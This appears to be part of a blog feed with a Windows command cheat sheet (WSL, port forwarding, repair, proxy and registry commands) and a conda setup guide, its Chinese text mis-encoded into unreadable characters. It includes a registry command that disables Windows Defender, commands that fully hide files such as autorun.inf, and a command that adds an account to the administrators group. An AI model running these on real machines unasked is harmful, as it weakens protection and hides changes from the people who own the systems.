<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹</span></span><br><span class="line"><span class="variable">$Env:path</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®</span></span><br><span class="line"><span class="variable">$Env:ETCDCTL_API</span>=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿½åŠ </span></span><br><span class="line"><span class="variable">$Env:path</span>=<span class="variable">$Env:Path</span>+<span class="string">&quot;;C:\Run&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»é™¤</span></span><br><span class="line"><span class="built_in">remove-item</span> env:all_proxy</span><br></pre></td></tr></table></figure>



<h2 id="å¿«æ·è¿è¡Œ"><a href="#å¿«æ·è¿è¡Œ" class="headerlink" title="å¿«æ·è¿è¡Œ"></a>å¿«æ·è¿è¡Œ</h2><p>ä½¿ç”¨<code>Win + R</code>æ‰“å¼€<code>è¿è¡Œ</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¿é—®å­ç³»ç»Ÿ</span></span><br><span class="line">\\wsl<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># é©±åŠ¨ç¨‹åºéªŒè¯ç¨‹åºç®¡ç†å™¨ </span></span><br><span class="line">verifier</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢å¯åŠ¨åŠ è½½é¡¹</span></span><br><span class="line">bcdedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å†Œè¡¨ç¼–è¾‘å™¨</span></span><br><span class="line">regedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç³»ç»Ÿå±æ€§</span></span><br><span class="line">sysdm.cpl</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">winver</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯ä¹¦ç®¡ç†</span></span><br><span class="line">certmgr.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">msinfo32</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœåŠ¡ç®¡ç†</span></span><br><span class="line">services.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æˆ·ç»„ç®¡ç†</span></span><br><span class="line">lusrmgr.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»»åŠ¡ç®¡ç†å™¨</span></span><br><span class="line">Taskmgr</span><br></pre></td></tr></table></figure>



<h2 id="Linuxå­ç³»ç»Ÿ"><a href="#Linuxå­ç³»ç»Ÿ" class="headerlink" title="Linuxå­ç³»ç»Ÿ"></a>Linuxå­ç³»ç»Ÿ</h2><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># æŸ¥çœ‹å­ç³»ç»Ÿåˆ—è¡¨åŠåˆ†å‘ç‰ˆæœ¬</span></span><br><span class="line"><span class="title">wsl</span> -l -v</span><br><span class="line"></span><br><span class="line"><span class="meta"># å¸è½½å·²ç»å®‰è£…çš„å‘è¡Œç‰ˆ</span></span><br><span class="line"><span class="title">wslconfig</span> /unregister &lt;name&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta"># å‡çº§wslç‰ˆæœ¬</span></span><br><span class="line"><span class="title">wsl</span> <span class="comment">--set-version &lt;distribution name&gt; &lt;versionNumber&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># å…³é—­ æ‰€æœ‰WSLæœåŠ¡</span></span><br><span class="line"><span class="title">wsl</span> <span class="comment">--shudown</span></span><br><span class="line"><span class="title">net</span> stop <span class="type">LxssManager</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># ç§»åŠ¨WSL</span></span><br><span class="line"><span class="meta"># https://github.com/DDoSolitary/LxRunOffline</span></span><br><span class="line"><span class="type">LxRunOffline</span>.exe move -n &lt;wsl-name&gt; -d &lt;dir&gt;</span><br><span class="line"></span><br><span class="line"><span class="title">lxrunoffline</span> m -n docker-desktop -d <span class="type">D</span>:\<span class="type">OWQ</span>\<span class="type">Docker</span>\wsl\distro</span><br><span class="line"><span class="title">lxrunoffline</span> m -n docker-desktop-<span class="class"><span class="keyword">data</span> -d <span class="type">D</span>:\<span class="type">OWQ</span>\<span class="type">Docker</span>\wsl\<span class="keyword">data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># æŸ¥çœ‹è·¯å¾„</span></span><br><span class="line"><span class="title">lxrunoffline</span> di -n docker-desktop</span><br><span class="line"><span class="title">lxrunoffline</span> di -n docker-desktop-<span class="class"><span class="keyword">data</span></span></span><br></pre></td></tr></table></figure>

<h3 id="WSL2ç«¯å£è½¬å‘"><a href="#WSL2ç«¯å£è½¬å‘" class="headerlink" title="WSL2ç«¯å£è½¬å‘"></a>WSL2ç«¯å£è½¬å‘</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®ç«¯å£è½¬å‘</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=ã€å®¿ä¸»æœºwindowså¹³å°ç›‘å¬ç«¯å£ã€‘ listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span> connectport=ã€wsl2å¹³å°ç›‘å¬ç«¯å£ã€‘ connectaddress=ã€wsl2å¹³å°ipã€‘protocol=tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">80</span> listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span> connectport=<span class="number">80</span> connectaddress=<span class="number">172.30</span>.<span class="number">144.91</span> protocol=tcp</span><br><span class="line">æˆ–</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">80</span> listenaddress=* connectport=<span class="number">80</span> connectaddress=<span class="number">172.30</span>.<span class="number">144.91</span> protocol=tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç«¯å£è½¬å‘çŠ¶æ€</span></span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤ç«¯å£è½¬å‘</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=ã€å®¿ä¸»æœºwindowså¹³å°ç›‘å¬ç«¯å£ã€‘ listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">80</span> listenaddress=*</span><br><span class="line">æˆ–</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">80</span> listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨æ„: å†™çš„æ˜¯0.0.0.0åˆ çš„æ—¶å€™ä¹Ÿéœ€è¦æ˜¯0.0.0.0è¿›è¡Œå¯¹åº”ï¼Œä¸ç„¶ä¼šæç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ã€‚</span></span><br></pre></td></tr></table></figure>



<h2 id="ç©ºé—´ä¼˜åŒ–"><a href="#ç©ºé—´ä¼˜åŒ–" class="headerlink" title="ç©ºé—´ä¼˜åŒ–"></a>ç©ºé—´ä¼˜åŒ–</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‹ç¼©ç³»ç»Ÿç©ºé—´</span></span><br><span class="line">compact /compactos:always</span><br></pre></td></tr></table></figure>



<h2 id="ä¿®å¤å‘½ä»¤"><a href="#ä¿®å¤å‘½ä»¤" class="headerlink" title="ä¿®å¤å‘½ä»¤"></a>ä¿®å¤å‘½ä»¤</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SFCæ‰«æ</span></span><br><span class="line">sfc /scannow</span><br><span class="line"></span><br><span class="line"><span class="comment"># DISMæ‰«æ</span></span><br><span class="line">DISM /Online /Cleanup<span class="literal">-Image</span> /RestoreHealth</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç£ç›˜ä¿®å¤</span></span><br><span class="line">chkdsk C:/f</span><br></pre></td></tr></table></figure>



<h2 id="æ–‡ä»¶ç›®å½•"><a href="#æ–‡ä»¶ç›®å½•" class="headerlink" title="æ–‡ä»¶ç›®å½•"></a>æ–‡ä»¶ç›®å½•</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤æ–‡ä»¶/ç›®å½•</span></span><br><span class="line"><span class="built_in">rmdir</span> /s/q &lt;<span class="built_in">dir</span>&gt; åˆ é™¤æ•´ä¸ªç›®å½•</span><br><span class="line">    /s æ˜¯ä»£è¡¨åˆ é™¤æ‰€æœ‰å­ç›®å½•è·Ÿå…¶ä¸­çš„æ¡£æ¡ˆã€‚ </span><br><span class="line">    /q æ˜¯ä¸è¦å®ƒåœ¨åˆ é™¤æ¡£æ¡ˆæˆ–ç›®å½•æ—¶ï¼Œä¸å†é—®æˆ‘ Yes or No çš„åŠ¨ä½œã€‚ </span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line"><span class="built_in">md</span> &lt;catalogue&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶åªè¯»ã€éšè—å±æ€§ä¿®æ”¹</span></span><br><span class="line">attrib S <span class="built_in">H</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å¸®åŠ©(cmd)</span></span><br><span class="line">help attrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ–‡ä»¶æˆ–ç›®å½•å½»åº•éšè—åœ¨èµ„æºç®¡ç†å™¨ä¸­</span></span><br><span class="line">attrib +s +a +<span class="built_in">h</span> +<span class="built_in">r</span> D:\\ico.ico</span><br><span class="line">attrib +s +a +<span class="built_in">h</span> +<span class="built_in">r</span> D:\\autorun.inf</span><br><span class="line"><span class="comment"># æ¢å¤æ­£å¸¸æ˜¾ç¤º</span></span><br><span class="line">attrib <span class="literal">-s</span> <span class="literal">-a</span> <span class="literal">-h</span> <span class="literal">-r</span> C:\\ico.ico</span><br></pre></td></tr></table></figure>



<h2 id="ç”µæºç›¸å…³"><a href="#ç”µæºç›¸å…³" class="headerlink" title="ç”µæºç›¸å…³"></a>ç”µæºç›¸å…³</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”µæºæ§åˆ¶</span></span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/s</span>			å…³æœº</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/r</span>			é‡å¯</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/l</span>			æ³¨é”€</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/h</span> <span class="string">/f</span>		ä¼‘çœ </span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/a</span>			å–æ¶ˆå…³æœº</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/s</span> <span class="string">/t</span> 3600	å®šæ—¶å…³æœºï¼ˆå•ä½ç§’ï¼‰</span><br></pre></td></tr></table></figure>



<h2 id="ç½‘ç»œç›¸å…³"><a href="#ç½‘ç»œç›¸å…³" class="headerlink" title="ç½‘ç»œç›¸å…³"></a>ç½‘ç»œç›¸å…³</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç½‘å¡ä¿¡æ¯</span></span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·¯ç”±è·Ÿè¸ª</span></span><br><span class="line">tracert &lt;åŸŸå&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘å…³(DNS)æŸ¥è¯¢</span></span><br><span class="line">nslookup &lt;åŸŸå&gt; [DNSæœåŠ¡å™¨]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹è·¯ç”±è¡¨</span></span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ‰¿è½½ç½‘ç»œæ¨¡å¼</span></span><br><span class="line">netsh wlan <span class="keyword">set</span> hostednetwork mode=allow</span><br><span class="line"><span class="comment"># è®¾ç½®æ— çº¿çƒ­ç‚¹åç§°å’Œå¯†ç </span></span><br><span class="line">netsh wlan <span class="keyword">set</span> hostednetwork ssid=CooNb key=<span class="string">&quot;passwprd&quot;</span></span><br><span class="line"><span class="comment"># å¯åŠ¨æ‰¿è½½ç½‘ç»œ</span></span><br><span class="line">netsh wlan start hostednetwork</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP ä»£ç†è®¾ç½®</span></span><br><span class="line"><span class="keyword">set</span> http_proxy=http:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"><span class="keyword">set</span> https_proxy=http:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"><span class="comment"># SOCKS5 ä»£ç†è®¾ç½®</span></span><br><span class="line"><span class="keyword">set</span> http_proxy=socks5:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"><span class="keyword">set</span> https_proxy=socks5:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å–æ¶ˆä»£ç†</span></span><br><span class="line"><span class="keyword">unset</span> http_proxy &amp; <span class="keyword">unset</span> https_proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»£ç†æ£€æµ‹</span></span><br><span class="line">curl -vv http:<span class="string">//www.google.com</span></span><br></pre></td></tr></table></figure>



<h2 id="ç¼–ç ç›¸å…³"><a href="#ç¼–ç ç›¸å…³" class="headerlink" title="ç¼–ç ç›¸å…³"></a>ç¼–ç ç›¸å…³</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰ç¼–ç </span></span><br><span class="line">chcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ä¸ºUTF-8</span></span><br><span class="line">chcp 65001</span><br><span class="line">    - 65001  UTF-8</span><br><span class="line">    - 20936  GB2312</span><br><span class="line">    - 936    GBK</span><br><span class="line">    - 437    English US</span><br></pre></td></tr></table></figure>



<h2 id="å®ç”¨è®¾ç½®"><a href="#å®ç”¨è®¾ç½®" class="headerlink" title="å®ç”¨è®¾ç½®"></a>å®ç”¨è®¾ç½®</h2><h3 id="æ·»åŠ æ–°å»ºæ–‡æœ¬å¿«æ·é”®"><a href="#æ·»åŠ æ–°å»ºæ–‡æœ¬å¿«æ·é”®" class="headerlink" title="æ·»åŠ æ–°å»ºæ–‡æœ¬å¿«æ·é”®"></a>æ·»åŠ æ–°å»ºæ–‡æœ¬å¿«æ·é”®</h3><ul>
<li><code>Win + R</code>è¿è¡Œ<code>regedit</code>æ‰¾åˆ°<code>HKEY_CLASSES_ROOT\LocalSettings\ImmutableMuiCache\Strings\AAF68885</code></li>
<li>ä¹‹åæ‰¾åˆ°å³ä¾§çš„<code>@C:\Windows\system32\notepad.exe,-469</code>ï¼Œå°†å€¼ <code>æ–‡æœ¬æ–‡æ¡£</code> æ”¹ä¸º <code>æ–‡æœ¬æ–‡æ¡£ (&amp;T)</code></li>
<li>é‡åŠ¨èµ„æºç®¡ç†å™¨å°±å¯ä»¥çœ‹åˆ°æ•ˆæœäº†ï¼Œ<code>å³é”®&gt;w&gt;t</code>å°±å¯ä»¥å¿«é€Ÿæ–°å»ºä¸€ä¸ªTXTæ–‡æœ¬äº†</li>
</ul>
<h3 id="æ”¹å˜CMDç¼–ç ä¸ºUTF-8-ä»¥ä½¿ç”¨Truetypeå­—ä½“-ä¸æ¨è"><a href="#æ”¹å˜CMDç¼–ç ä¸ºUTF-8-ä»¥ä½¿ç”¨Truetypeå­—ä½“-ä¸æ¨è" class="headerlink" title="æ”¹å˜CMDç¼–ç ä¸ºUTF-8 ä»¥ä½¿ç”¨Truetypeå­—ä½“(ä¸æ¨è)"></a>æ”¹å˜CMDç¼–ç ä¸ºUTF-8 ä»¥ä½¿ç”¨Truetypeå­—ä½“(ä¸æ¨è)</h3><ul>
<li><code>Win + R</code>è¿è¡Œ<code>regedit</code>æ‰¾åˆ°<code>HKEY_LOCAL_MACHINE\Software\Microsoft\CommandProcessor</code></li>
<li>ä¿®æ”¹<code>Autorun</code>çš„å€¼ä¸º<code>@chcp 65001&gt;nul</code>ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹<code>Autorun</code>ï¼ŒæŠŠå€¼è®¾ä¸º<code>@chcp 65001&gt;nul</code></li>
<li>ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€ä¸€ä¸ªCMDçª—å£ï¼Œè¾“å…¥<code>REG ADD &quot;HKLM\Software\Microsoft\Command Processor&quot; /v Autorun /t REG_SZ /d &quot;@chcp 65001&gt;nul&quot;</code></li>
<li>æŸ¥çœ‹<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Console\TrueTypeFont</code></li>
</ul>
<h2 id="ç–‘éš¾æ‚ç—‡"><a href="#ç–‘éš¾æ‚ç—‡" class="headerlink" title="ç–‘éš¾æ‚ç—‡"></a>ç–‘éš¾æ‚ç—‡</h2><h3 id="è§£å†³æ–‡ä»¶è¢«å ç”¨"><a href="#è§£å†³æ–‡ä»¶è¢«å ç”¨" class="headerlink" title="è§£å†³æ–‡ä»¶è¢«å ç”¨"></a>è§£å†³æ–‡ä»¶è¢«å ç”¨</h3><p>æ–¹æ³•ä¸€</p>
<ul>
<li><p>å®šä½è¿›ç¨‹<br><code>Win+R</code>æ‰“å¼€ã€è¿è¡Œã€‘-&gt; è¾“å…¥<code>eventvwr.msc</code>å›è½¦æ‰“å¼€ã€äº‹ä»¶æŸ¥çœ‹å™¨ã€‘-&gt; äº‹ä»¶æŸ¥çœ‹å™¨ (æœ¬åœ°) -&gt; Windows æ—¥å¿—-&gt; ç³»ç»Ÿ -&gt; æ‰¾åˆ°æœ€è¿‘çš„ã€è­¦å‘Š æ¥æº Kernel-PnPã€‘-&gt; åŒå‡»æ‰“å¼€ -&gt; æ‰¾åˆ°ã€è¿›ç¨‹IDä¸º xx çš„åº”ç”¨ç¨‹åºå·²åœæ­¢åˆ é™¤æˆ–å¼¹å‡ºè®¾å¤‡ã€‘ï¼Œè®°ä½è¿™ä¸ªè¿›ç¨‹ IDã€‚</p>
</li>
<li><p>ç»“æŸè¿›ç¨‹</p>
<ul>
<li>æ‰“å¼€ã€ä»»åŠ¡ç®¡ç†å™¨ã€‘-&gt; è¯¦ç»†ä¿¡æ¯ -&gt; ç‚¹å‡» PID æ’åº -&gt; æ‰¾åˆ° ID å¯¹åº”çš„è¿›ç¨‹ï¼Œå°è¯•ç»“æŸè¿›ç¨‹ã€‚</li>
</ul>
</li>
</ul>
<p>æ–¹æ³•äºŒ</p>
<ul>
<li><code>Win+R</code> æ‰“å¼€ã€è¿è¡Œã€‘-&gt; è¾“å…¥ <code>taskmgr</code> å›è½¦æ‰“å¼€ã€ä»»åŠ¡ç®¡ç†å™¨ã€‘-&gt; æ€§èƒ½ -&gt; æ‰“å¼€èµ„æºç›‘è§†å™¨ -&gt; CPU -&gt; å…³è”çš„å¥æŸ„ -&gt; è¾“å…¥ä½ çš„ç›˜ç¬¦, ä¾‹å¦‚ä½ çš„ç§»åŠ¨å­˜å‚¨è®¾å¤‡æ˜¯ F ç›˜, è¾“å…¥ F: -&gt; æŠŠä¸‹é¢æœç´¢å‡ºæ¥çš„è¿›ç¨‹å…¨éƒ¨ç»“æŸã€‚</li>
</ul>
<p>æ–¹æ³•ä¸‰</p>
<ul>
<li><code>Win+X</code> æ‰“å¼€ è®¡ç®—æœºç®¡ç† -&gt; ç£ç›˜ç®¡ç†ï¼Œå³é”®ï¼Œé€‰æ‹©è„±æœº</li>
</ul>
<h3 id="å…³æœºåœç•™åœ¨ç­‰å¾…ç¨‹åºå…³é—­ç•Œé¢"><a href="#å…³æœºåœç•™åœ¨ç­‰å¾…ç¨‹åºå…³é—­ç•Œé¢" class="headerlink" title="å…³æœºåœç•™åœ¨ç­‰å¾…ç¨‹åºå…³é—­ç•Œé¢"></a>å…³æœºåœç•™åœ¨ç­‰å¾…ç¨‹åºå…³é—­ç•Œé¢</h3><p>æ‰“å¼€ <code>regedit</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ é”®ï¼š<code>AutoEndTasks</code> å€¼ï¼š1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> bootstatuspolicy ignoreallfailures</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;æœåŠ¡å&#125; recoveryenabled No  ä¿®æ”¹å¯åŠ¨</span><br></pre></td></tr></table></figure>



<h3 id="ç½‘ç»œæ­£å¸¸å›¾æ ‡æ˜¾ç¤ºæ— è¿æ¥"><a href="#ç½‘ç»œæ­£å¸¸å›¾æ ‡æ˜¾ç¤ºæ— è¿æ¥" class="headerlink" title="ç½‘ç»œæ­£å¸¸å›¾æ ‡æ˜¾ç¤ºæ— è¿æ¥"></a>ç½‘ç»œæ­£å¸¸å›¾æ ‡æ˜¾ç¤ºæ— è¿æ¥</h3><p>æ‰“å¼€ <code>regedit</code></p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ <code>EnableActiveProbing</code> å€¼ä¸º 0<br>æ‰“å¼€ <code>services.msc</code> æœåŠ¡ç®¡ç†<br>é‡å¯ <code>Microsoft Account Sign-in Assistant</code> æœåŠ¡</p>
<h3 id="é‡ç½®ç½‘ç»œè®¾ç½®åWiFiå›¾æ ‡æ¶ˆå¤±"><a href="#é‡ç½®ç½‘ç»œè®¾ç½®åWiFiå›¾æ ‡æ¶ˆå¤±" class="headerlink" title="é‡ç½®ç½‘ç»œè®¾ç½®åWiFiå›¾æ ‡æ¶ˆå¤±"></a>é‡ç½®ç½‘ç»œè®¾ç½®åWiFiå›¾æ ‡æ¶ˆå¤±</h3><p><code>Win+R</code>è¾“å…¥<code>services.msc</code><br>æ‰¾åˆ°<code>WLAN AutoConfig</code>å’Œ<code>Wired AutoConfig</code>æœåŠ¡ï¼Œç¡®ä¿æœåŠ¡ä¸ºå¼€å¯çŠ¶æ€</p>
<h3 id="è®¿é—®ä¸äº†ç½‘ç»œ"><a href="#è®¿é—®ä¸äº†ç½‘ç»œ" class="headerlink" title="è®¿é—®ä¸äº†ç½‘ç»œ"></a>è®¿é—®ä¸äº†ç½‘ç»œ</h3><ul>
<li>è¿è¡Œ inetcpl.cpl</li>
<li>é«˜çº§--ä½¿ç”¨TLS1.2--è¿˜åŸé«˜çº§è®¾ç½®</li>
</ul>
<h3 id="å–æ¶ˆå¾®è½¯æœåŠ¡ä»£ç†è½¬å‘"><a href="#å–æ¶ˆå¾®è½¯æœåŠ¡ä»£ç†è½¬å‘" class="headerlink" title="å–æ¶ˆå¾®è½¯æœåŠ¡ä»£ç†è½¬å‘"></a>å–æ¶ˆå¾®è½¯æœåŠ¡ä»£ç†è½¬å‘</h3><ul>
<li>å®‰è£…<code>Fiddler4</code></li>
<li>æ‰“å¼€å·¦ä¸Šè§’<code>winconfig</code></li>
<li>æŠŠå¾®è½¯äº§å“å…¨éƒ¨æ‰“å‹¾ä¿å­˜</li>
</ul>
<h3 id="ç¦ç”¨-x2F-æ¢å¤-Windows-Defender"><a href="#ç¦ç”¨-x2F-æ¢å¤-Windows-Defender" class="headerlink" title="ç¦ç”¨&#x2F;æ¢å¤ Windows Defender"></a>ç¦ç”¨&#x2F;æ¢å¤ Windows Defender</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¦ç”¨</span></span><br><span class="line">reg add â€œHKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defenderâ€ /v â€œDisableAntiSpywareâ€ /d <span class="number">1</span> /t REG_DWORD /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¢å¤</span></span><br><span class="line">reg add â€œHKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defenderâ€ /v â€œDisableAntiSpywareâ€ /d <span class="number">0</span> /t REG_DWORD /f</span><br></pre></td></tr></table></figure>

<h3 id="ç”¨æˆ·æƒé™é—®é¢˜"><a href="#ç”¨æˆ·æƒé™é—®é¢˜" class="headerlink" title="ç”¨æˆ·æƒé™é—®é¢˜"></a>ç”¨æˆ·æƒé™é—®é¢˜</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ–°å»ºç”¨æˆ·è´¦å·</span></span><br><span class="line">net user &lt;user&gt; &lt;passwd&gt; /add</span><br><span class="line"><span class="comment"># èµ‹äºˆè¯¥è´¦å·ç®¡ç†å‘˜æƒé™</span></span><br><span class="line">net localgroup administrators &lt;user&gt; /add</span><br><span class="line"><span class="comment"># åˆ é™¤ç”¨æˆ·è´¦å·</span></span><br><span class="line">net user &lt;user&gt; /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>cmd</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>conda å‘½ä»¤</title>
    <url>/conda/</url>
    <content><![CDATA[<blockquote>
<p>Windowså®‰è£…åŒ…ï¼š<span class="exturl" data-url="aHR0cHM6Ly9yZXBvLmNvbnRpbnV1bS5pby9taW5pY29uZGEvTWluaWNvbmRhMy1sYXRlc3QtV2luZG93cy14ODZfNjQuZXhl">https://repo.continuum.io/miniconda/Miniconda3-latest-Windows-x86_64.exe</span></p>
</blockquote>
<h2 id="å®‰è£…é…ç½®"><a href="#å®‰è£…é…ç½®" class="headerlink" title="å®‰è£…é…ç½®"></a>å®‰è£…é…ç½®</h2><ul>
<li><p>ä¸‹è½½è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯åŠ¨è„šæœ¬</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sh</span> Miniconda3-latest-Linux-x86_64.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p>é»˜è®¤å®‰è£…åœ¨<code>$HOME/miniconda3</code>ä¸‹ï¼Œè¿™é‡Œæˆ‘å°†å…¶å®‰è£…åœ¨<code>/usr/local/miniconda</code>ä¸‹</p>
</li>
<li><p>å–æ¶ˆé»˜è®¤æ¿€æ´»condaç¯å¢ƒ</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">conda<span class="built_in"> config </span>--<span class="built_in">set</span> auto_activate_base <span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¯å¢ƒé…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /usr/local/miniconda/bin/activate <span class="comment"># æ¿€æ´»ç¯å¢ƒ</span></span><br><span class="line">conda init zsh	<span class="comment"># ä½¿ç”¨çš„ç»ˆç«¯</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="è™šæ‹Ÿç¯å¢ƒ"><a href="#è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="è™šæ‹Ÿç¯å¢ƒ"></a>è™šæ‹Ÿç¯å¢ƒ</h2><h3 id="åˆ›å»ºç¯å¢ƒ"><a href="#åˆ›å»ºç¯å¢ƒ" class="headerlink" title="åˆ›å»ºç¯å¢ƒ"></a>åˆ›å»ºç¯å¢ƒ</h3><ul>
<li><p>3.6</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">6</span> python=<span class="number">3</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>3.8</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">8</span> python=<span class="number">3</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>3.9</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">9</span> python=<span class="number">3</span>.<span class="number">9</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>3.10</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">10</span> python=<span class="number">3</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="åˆ é™¤ç¯å¢ƒ"><a href="#åˆ é™¤ç¯å¢ƒ" class="headerlink" title="åˆ é™¤ç¯å¢ƒ"></a>åˆ é™¤ç¯å¢ƒ</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">conda <span class="built_in">remove</span> -n <span class="symbol">&lt;name&gt;</span> --<span class="keyword">all</span></span><br></pre></td></tr></table></figure>

